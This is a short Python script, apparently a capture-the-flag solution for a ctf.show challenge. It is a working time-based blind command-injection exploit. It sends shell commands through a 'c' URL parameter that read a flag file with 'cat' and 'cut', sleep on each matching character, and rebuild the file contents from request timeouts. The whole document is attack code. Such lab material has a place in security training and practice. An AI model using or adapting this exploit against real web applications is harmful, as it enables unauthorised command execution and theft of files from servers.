import requests
url = 'http://809d0e58-a90a-43da-ba39-231109512b3c.challenge.ctf.show'
res = ''
for j in range(1,60):
    for k in range(32,128):
        k = chr(k)
        payload = "?c="+f"if [ `cat /f149_15_h3r3 | cut -c {j}` == {k} ];then sleep 2;fi"
        try:
            requests.get(url=url+payload,timeout=(1.5,1.5))
        except:
            res += k
            print(res)
            break
res += ' '